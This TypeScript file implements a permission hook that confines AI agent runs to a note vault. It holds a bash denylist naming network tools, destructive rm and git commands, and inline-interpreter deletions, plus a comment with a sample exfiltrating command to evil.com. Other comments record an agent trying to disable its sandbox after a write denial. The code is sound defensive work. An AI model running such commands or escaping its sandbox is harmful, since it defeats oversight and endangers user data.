/**
 * Permission enforcement for agent runs (CLAUDE.md hard rule 4).
 *
 * WHY THIS IS A PreToolUse HOOK, NOT `canUseTool`
 * ----------------------------------------------
 * `canUseTool` is advisory and shadowable. Measured against the real SDK
 * (`server/src/cli/permprobe.ts`): a deny-everything `canUseTool` was invoked
 * **zero** times and the canary command executed. The SDK says so itself:
 *
 *   "Bare allowedTools entries auto-approve the whole tool before the callback is
 *    consulted. To gate every tool call, use a PreToolUse hook; ... Allow rules
 *    from settings files can also shadow the callback but are not visible here."
 *
 * A PreToolUse hook IS invoked and DOES block — verified with a side-effect canary
 * (`touch <file>` denied ⇒ no file on disk). So the hook is the boundary; the
 * `canUseTool` callback is kept only as a redundant second layer.
 *
 * WHAT IS ACTUALLY GUARANTEED (rule 4, as clarified with the user 2026-07-17)
 * --------------------------------------------------------------------------
 * Hard, enforceable:
 *   - writes/reads confined to VAULT_ROOT for every path-bearing tool
 *   - no web egress during ingest
 * Best-effort, defense in depth:
 *   - bash is denied for clearly dangerous shapes (network, privilege escalation,
 *     writes outside the vault) and allowed otherwise.
 *
 * The bash layer is deliberately NOT presented as a hard boundary. Deciding what an
 * arbitrary shell string does is not tractable, and the real ingest needs general
 * bash: of the 68 Bash calls in the validated M0 run, 54 were vault `scripts/*.sh`
 * and 14 were exploration (`find`, `ls`, `cat`, `python3`, `&&` chains). A whitelist
 * that only permits `scripts/*.sh` would have blocked that run. Claiming a guarantee
 * we cannot keep would be worse than naming the limit.
 */

import path from 'node:path'
import type { PermissionResult } from '@anthropic-ai/claude-agent-sdk'
import { isExemptPath, isSubsequence } from './expand.js'

/** Web tools are hard-denied except in the `research` profile (SPEC.md §9, §6.4 autoresearch). */
export const WEB_TOOLS = ['WebSearch', 'WebFetch'] as const

/** Vault-mutating tools — denied in the read-only `query` profile (SPEC.md §5). */
export const WRITE_TOOLS = ['Write', 'Edit', 'MultiEdit', 'NotebookEdit'] as const

/**
 * The kind of run, which decides web egress and vault writes (SPEC.md §5, §6.3, §6.4):
 *  - `ingest`   — writes to the vault, no web (the M1 default)
 *  - `query`    — READ-ONLY: no web, no vault writes (the chat runner)
 *  - `research` — writes to the vault AND has web egress (autoresearch only)
 *
 * `maintenance` (lint / hot-cache / save) shares the `ingest` profile: writes, no web.
 */
export type RunProfile = 'ingest' | 'query' | 'research'

/** Whether a profile is allowed to reach the web. Only `research` is. */
export function profileAllowsWeb(profile: RunProfile): boolean {
  return profile === 'research'
}

/** Whether a profile may mutate the vault. `query` may not (read-only). */
export function profileAllowsVaultWrite(profile: RunProfile): boolean {
  return profile !== 'query'
}

/** Tools whose input names a path we must confine to the vault. */
const PATH_INPUT_KEYS = ['file_path', 'path', 'notebook_path'] as const

/** Vault scripts are always allowed — this is the intended bash surface. */
const VAULT_SCRIPT_COMMAND = /(?:^|[\s;&|(])(?:(?:ba)?sh\s+)?(?:\.\/)?scripts\/[A-Za-z0-9._-]+\.sh(?:\s|$)/

/**
 * Bash shapes refused outright. Best-effort by construction: this is a denylist, and
 * a denylist can be evaded. It exists to catch the obvious, not to be a sandbox.
 */
const BASH_DENY: ReadonlyArray<{ readonly pattern: RegExp; readonly why: string }> = [
  {
    pattern: /(?:^|[\s;&|(])(?:curl|wget|nc|ncat|telnet|ssh|scp|rsync|ftp)(?:\s|$)/,
    why: 'network egress is not permitted during ingest (SPEC.md §9)',
  },
  {
    pattern: /(?:^|[\s;&|(])(?:sudo|su|doas|chmod\s+[0-7]*777|chown)(?:\s|$)/,
    why: 'privilege escalation and ownership changes are not permitted',
  },
  {
    pattern: /(?:^|[\s;&|(])rm\s+(?:-[A-Za-z]*\s+)*(?:\/(?!home\/[^/\s]+\/vault)|~(?!\/vault)|\$HOME(?!\/vault))/,
    why: 'destructive removal outside the vault is not permitted',
  },
  {
    pattern: /(?:^|[\s;&|(])(?:mkfs|dd\s+if=|shutdown|reboot|systemctl|kill(?:all)?)(?:\s|$)/,
    why: 'system-level commands are not permitted',
  },
  /*
   * DESTRUCTIVE AND HISTORY-REWRITING GIT, and bulk deletion inside the wiki.
   *
   * Why these two are here at all, when the sandbox is what protects the vault: the sandbox
   * allows writes under VAULT_ROOT, and `.git` lives under VAULT_ROOT. So history destruction
   * is the one class it structurally cannot contain, and it is the one class that is not
   * recoverable - hard rule 1's guarantee is that every vault mutation stays "versioned and
   * revertable", and a `git reset --hard` or a `filter-branch` takes the versions away.
   * `jobs.commit_hash` then points at nothing, and with it the revert button and the job rows.
   *
   * This is NOT the `scripts/*.sh` whitelist hard rule 4 forbids, and it is not an attempt to
   * decide what an arbitrary shell string writes - that is still not tractable and still the
   * sandbox's job. It is a denylist of named shapes that have no legitimate use in any run this
   * service starts: no run of ours rewrites history, discards the working tree, or deletes
   * pages (a page delete is the user's, through DELETE /api/v1/pages, in service code).
   *
   * Measured 2026-09-19: all nine of these shapes were permitted by the four entries above.
   * `git push --force` is included although both vault remotes are pushed-disabled, because a
   * guard that depends on a remote staying misconfigured is not a guard.
   */
  {
    pattern:
      /(?:^|[\s;&|(])git\s[^;&|\n]*?(?:reset\s+--(?:hard|merge)|clean(?:\s|$)|checkout\s+(?:--\s|-f\b|--force\b)|restore\b|filter-branch\b|filter-repo\b|reflog\s+expire\b|--prune\b|update-ref\s+-d\b|branch\s+-[dD]\b|push\s[^;&|\n]*(?:--force\b|-f\b)|commit\s[^;&|\n]*--amend\b|rebase\b)/,
    why: 'git that destroys or rewrites history is not permitted: every vault mutation has to stay versioned and revertable (CLAUDE.md hard rule 1), and this is the one class the sandbox cannot contain because .git lives inside the write-allowed root',
  },
  {
    /*
     * The `rm` entry above guards paths OUTSIDE the vault; this one guards the wiki itself.
     * `find` needs no path qualifier: bulk deletion by find has no legitimate use in a run,
     * while the one legitimate recursive removal a skill documents (the retrieval index under
     * `.vault-meta/`) names its own paths and stays allowed.
     */
    pattern:
      /(?:^|[\s;&|(])(?:find\s[^;&|\n]*(?:-delete\b|-exec\s+(?:rm|truncate|shred)\b)|(?:truncate|shred)\s|rm\s+(?:-[A-Za-z]*\s+)*[^\s;&|]*wiki\/)/,
    why: 'bulk deletion or truncation of vault pages is not permitted: pages are removed by the user through the dashboard, never by a run',
  },
  {
    /*
     * The same destruction spelled as an interpreter one-liner, which the two entries above
     * read as an ordinary `python3` call. Deliberately narrow: it matches NAMED destructive
     * calls inside an inline `-c`/`-e` script, nothing else. A script FILE doing the same
     * thing passes, and that is the sandbox's job rather than this list's - the point here is
     * that the obvious spelling should not be the easy way around the entries above.
     *
     * The scan after `-c` deliberately crosses `;`: the script is ONE quoted argument and its
     * statements are separated by semicolons, so stopping at the first one reads
     * `python3 -c "import shutil; shutil.rmtree(...)"` as harmless. It stops at a newline.
     */
    pattern:
      /(?:^|[\s;&|(])(?:python3?|perl|ruby|node)\s[^;&|\n]*-[ce]\s[^\n]*(?:rmtree|os\.remove|os\.unlink|\bunlink\b|fs\.rmSync|fs\.unlinkSync|rimraf|shutil\.move)/,
    why: 'deleting vault files through an inline interpreter script is not permitted, for the same reason as the shell forms above',
  },
]

/**
 * The expand lock (docs/sources/SPEC.md section 8.2): what a `research-expand` run may touch.
 *
 * The rules the prompt states are enforced here too, at tool time, because a prompt is a request
 * and this is a decision. What it CANNOT see is a page written through Bash - deciding what an
 * arbitrary shell string writes is not tractable (see the file header) - so the commit check and
 * the revert stay exactly as they are, as the backstop for that and for anything else.
 */
export interface ExpandPolicy {
  /** Vault-relative POSIX paths the run may edit; everything else is off limits. */
  readonly pageSet: readonly string[]
  /** How many pages it may create. */
  readonly maxNew: number
  /** The pages it HAS created, per run: the cap counts this run, not the vault. */
  readonly created: Set<string>
  /** Whether a vault-relative path exists; injected, so the decision stays testable. */
  readonly exists: (rel: string) => boolean
  /**
   * The page as it stands right now, for the frontmatter exception: an edit is only frontmatter
   * when its `old_string` really lies in the page's frontmatter block. Optional - without it the
   * exception falls back to the SHAPE of the edit, which a body passage can imitate.
   */
  readonly read?: (rel: string) => string | undefined
}

export interface PermissionContext {
  /** Absolute, resolved vault root. */
  readonly vaultRoot: string
  /** The run profile; defaults to `ingest` when omitted (back-compat with M1 call sites). */
  readonly profile?: RunProfile
  /**
   * Optional upstream-protection check (hard rule 5): refusal reason for a WRITE-tool
   * path inside the vault, or undefined to allow. Applied to WRITE_TOOLS only — reads
   * of plugin files stay unrestricted (skills consult their own docs). Like the bash
   * denylist, this cannot cover Bash-written files; it is tool-level defense in depth.
   */
  readonly writeGuard?: (resolvedPath: string) => string | undefined
  /**
   * Set for a `research-expand` run only (section 8.2). Absent for every other run, which is why
   * an ordinary ingest may still rewrite a page: rewriting is what ingest does.
   */
  readonly expand?: ExpandPolicy
}

/** The frontmatter keys an expand run may change (docs/agents/SPEC.md section 7). */
const FRONTMATTER_EDITABLE = new Set(['updated', 'related', 'tags'])

/** Non-empty lines, trimmed: the unit both this check and the commit check compare. */
const editLines = (text: string): string[] => text.split('\n').map((l) => l.trim()).filter((l) => l !== '')

/**
 * The vault's `related:` footer, which the commit check does not compare (`bodyLines` filters it)
 * and the prompt explicitly lets a run rewrite: the skill keeps it at the end of a page and
 * rewrites it as links are added. The hook has to ignore the same line, or it refuses exactly
 * what the rules block asks for.
 */
const isRelatedLine = (line: string): boolean => /^related:\s/i.test(line)

/** The frontmatter block of a page, or undefined when it has none. */
function frontmatterBlock(page: string): string | undefined {
  if (!page.startsWith('---')) return undefined
  const end = page.indexOf('\n---', 3)
  return end === -1 ? undefined : page.slice(3, end)
}

/**
 * Whether an edit that drops lines is nevertheless only changing the frontmatter fields the rules
 * allow: a key line (`updated: ...`) or a list item under one, with every line that disappears
 * belonging to `updated`, `related` or `tags`.
 *
 * `frontmatter` is the page's own block when it could be read, and then the edit has to lie
 * INSIDE it - a passage of body text shaped like frontmatter (a `tags:` line and some bullets)
 * is body text, and losing a line of it is the rewrite this rule exists to stop. Without the page
 * the shape is all there is; the commit check still sees the body line and reverts, which is the
 * safe way round for a hook to be imprecise.
 */
function frontmatterOnly(oldText: string, oldLines: readonly string[], newLines: readonly string[], frontmatter: string | undefined): boolean {
  if (frontmatter !== undefined && !frontmatter.includes(oldText.trim())) return false
  let key: string | undefined
  for (const line of oldLines) {
    const m = /^([A-Za-z_][\w-]*):/.exec(line)
    if (m !== null) key = m[1]!.toLowerCase()
    else if (!/^-\s/.test(line)) return false
    if (newLines.includes(line)) continue
    if (key === undefined || !FRONTMATTER_EDITABLE.has(key)) return false
    // A key may change its value, never disappear: `updated:` has to still be there afterwards.
    if (m !== null && !newLines.some((l) => l.toLowerCase().startsWith(`${key}:`))) return false
  }
  return true
}

/**
 * Additivity for one edit (section 8.2 rule 4): every line the edit names must still be there
 * afterwards. `isSubsequence` is the same function the commit check uses, over the same shape, so
 * the hook cannot be stricter or laxer than the check that reverts a run.
 */
function additivityRefusal(edit: Record<string, unknown>, frontmatter: string | undefined): string | undefined {
  if (edit['replace_all'] === true) {
    return 'replace_all rewrites every occurrence of the text; insert instead, once, where it belongs'
  }
  const before = edit['old_string']
  const after = edit['new_string']
  if (typeof before !== 'string' || typeof after !== 'string') return 'an edit without old_string/new_string cannot be checked for additivity'
  const oldLines = editLines(before)
  const newLines = editLines(after)
  // The `related:` footer is compared by neither side (see {@link isRelatedLine}).
  const check = isSubsequence(oldLines.filter((l) => !isRelatedLine(l)), newLines.filter((l) => !isRelatedLine(l)))
  if (check.ok) return undefined
  if (frontmatterOnly(before, oldLines, newLines, frontmatter)) return undefined
  return (
    `this edit would remove "${check.missing.slice(0, 120)}" from the page. ` +
    'insert instead of replacing; every existing line must survive (only `updated`, `related` and `tags` may change)'
  )
}

/**
 * The expand decision for one path (section 8.2). Returns a refusal reason, or undefined to allow.
 * The page set is the run's own; bookkeeping pages and anything outside `wiki/` are exempt, the
 * same set the commit check exempts.
 */
function expandRefusal(policy: ExpandPolicy, rel: string, toolName: string, input: Record<string, unknown>): string | undefined {
  if (isExemptPath(rel)) return undefined
  /*
   * A page THIS run created is its own: it may finish it, link into it, rewrite it. The commit
   * check asks nothing of a new page's content either - it only counts them - and a hook stricter
   * than the check that reverts is a refusal the run cannot satisfy, which leaves it Bash, the one
   * write nothing here can see. Measured in review: a run that filed a source it cited could not
   * then put a wikilink in it.
   */
  if (policy.created.has(rel)) return undefined
  if (policy.pageSet.includes(rel)) {
    if (toolName === 'Write') {
      return `rewriting a listed page is not additive; use Edit and insert (${rel})`
    }
    if (toolName === 'NotebookEdit') return `a notebook edit cannot be checked for additivity (${rel})`
    // MultiEdit carries several edits; one that fails refuses the whole call.
    const page = policy.read?.(rel)
    const frontmatter = page === undefined ? undefined : frontmatterBlock(page)
    const edits = input['edits']
    if (Array.isArray(edits)) {
      for (const edit of edits) {
        const reason = additivityRefusal((edit ?? {}) as Record<string, unknown>, frontmatter)
        if (reason !== undefined) return reason
      }
      return undefined
    }
    return additivityRefusal(input, frontmatter)
  }
  // Not listed and not this run's own: a NEW page is the one thing allowed here, up to the cap.
  if (toolName !== 'Write' || policy.exists(rel)) {
    return `${rel} is outside the page set this run was given; leave a note in your notebook instead`
  }
  if (policy.created.size >= policy.maxNew) {
    return `the run may create at most ${policy.maxNew} new pages, and has already created ${policy.created.size}`
  }
  /*
   * Recorded here, as a side effect of the decision: a hook is asked BEFORE the tool runs and is
   * never told how it went, so a Write that is allowed and then fails still spends one of the
   * three. The cap is a ceiling, not an accountant.
   */
  policy.created.add(rel)
  return undefined
}

/** True when `candidate` is inside `root` (or is `root` itself). */
export function isInside(root: string, candidate: string): boolean {
  const rel = path.relative(root, candidate)
  // '' means candidate === root. A '..' prefix or an absolute result means outside.
  return rel === '' || (!rel.startsWith(`..${path.sep}`) && rel !== '..' && !path.isAbsolute(rel))
}

/** Extracts every path-like value from a tool input. */
export function extractPaths(input: Record<string, unknown>): string[] {
  const out: string[] = []
  for (const key of PATH_INPUT_KEYS) {
    const value = input[key]
    if (typeof value === 'string' && value !== '') out.push(value)
  }
  // MultiEdit-style batched edits carry their own path list.
  const edits = input['edits']
  if (Array.isArray(edits)) {
    for (const edit of edits) {
      if (edit && typeof edit === 'object') {
        const value = (edit as Record<string, unknown>)['file_path']
        if (typeof value === 'string' && value !== '') out.push(value)
      }
    }
  }
  return out
}

/** True when the command invokes one of the vault's own scripts. */
export function isVaultScriptCommand(command: string): boolean {
  return VAULT_SCRIPT_COMMAND.test(command.trim())
}

/**
 * Best-effort bash policy. Returns a refusal reason, or undefined to allow.
 * Vault scripts short-circuit to allowed; everything else is checked against the
 * denylist and permitted if nothing matches.
 */
export function bashRefusalReason(command: string): string | undefined {
  const trimmed = command.trim()
  if (trimmed === '') return 'empty command'
  // The denylist runs FIRST, before any vault-script recognition. Short-circuiting
  // on "starts with a vault script" is a bypass: `scripts/wiki-lock.sh list; curl
  // https://evil.com` contains a vault script AND exfiltrates. Being a vault script
  // is never a licence to skip the checks — it only matters if nothing is refused.
  for (const { pattern, why } of BASH_DENY) {
    if (pattern.test(trimmed)) return why
  }
  return undefined
}

/**
 * The single permission decision for one tool call.
 * Path confinement and web egress are hard; bash is best-effort (see file header).
 */
export function decidePermission(
  ctx: PermissionContext,
  toolName: string,
  input: Record<string, unknown>,
): PermissionResult {
  const profile = ctx.profile ?? 'ingest'

  if ((WEB_TOOLS as readonly string[]).includes(toolName) && !profileAllowsWeb(profile)) {
    return {
      behavior: 'deny',
      message: `${toolName} is not available in a ${profile} run: only autoresearch has web egress (SPEC.md §9). Work only from the vault.`,
    }
  }

  // Read-only (query) runs may not mutate the vault: the chat runner answers from the
  // wiki and must not let wiki-query's "file the answer back" behaviour write (SPEC.md §5;
  // saving is the explicit /save action). The sandbox (no vault write) is the hard floor;
  // this makes the refusal explicit and legible in the log.
  if (!profileAllowsVaultWrite(profile) && (WRITE_TOOLS as readonly string[]).includes(toolName)) {
    return {
      behavior: 'deny',
      message: `${toolName} is not available in a read-only query run: the chat runner does not modify the vault (SPEC.md §5). Use "Session in Vault sichern" to persist an answer.`,
    }
  }

  if (toolName === 'Bash') {
    // Belt and braces alongside `sandbox.allowUnsandboxedCommands: false`. The Bash
    // tool ships a `dangerouslyDisableSandbox` escape hatch; an agent that hits a
    // write denial reaches for it (observed). The sandbox setting is what actually
    // neutralises it — this refusal just makes the attempt visible in the log.
    if (input['dangerouslyDisableSandbox'] === true) {
      return {
        behavior: 'deny',
        message:
          'Refused: dangerouslyDisableSandbox is not permitted. Every command runs inside the ' +
          'vault sandbox; work within VAULT_ROOT instead of stepping outside it.',
      }
    }

    const command = input['command']
    if (typeof command !== 'string') {
      return { behavior: 'deny', message: 'Bash called without a string command.' }
    }
    const reason = bashRefusalReason(command)
    if (reason !== undefined) {
      return { behavior: 'deny', message: `Refused: ${reason}. Command: ${command}` }
    }
    return { behavior: 'allow' }
  }

  // Any tool naming a path must stay inside the vault, whatever it is. This is the
  // guarantee that actually protects the vault, and it is enforced without exception.
  const isWriteTool = (WRITE_TOOLS as readonly string[]).includes(toolName)
  for (const raw of extractPaths(input)) {
    const resolved = path.resolve(ctx.vaultRoot, raw)
    if (!isInside(ctx.vaultRoot, resolved)) {
      return {
        behavior: 'deny',
        message:
          `Path is outside the vault and may not be accessed: ${resolved}. ` +
          `All work stays under ${ctx.vaultRoot}.`,
      }
    }
    // Inside the vault, writes additionally respect the plugin boundary (hard rule 5):
    // the vault clone carries claude-obsidian's own machinery, which no run may edit.
    if (isWriteTool && ctx.writeGuard !== undefined) {
      const reason = ctx.writeGuard(resolved)
      if (reason !== undefined) {
        return { behavior: 'deny', message: `Refused: ${reason}` }
      }
    }
    // And a deepening run is held to its page set and to insertions (section 8.2).
    if (isWriteTool && ctx.expand !== undefined) {
      const rel = path.relative(ctx.vaultRoot, resolved).split(path.sep).join('/')
      const reason = expandRefusal(ctx.expand, rel, toolName, input)
      if (reason !== undefined) return { behavior: 'deny', message: `Refused: ${reason}` }
    }
  }

  return { behavior: 'allow' }
}
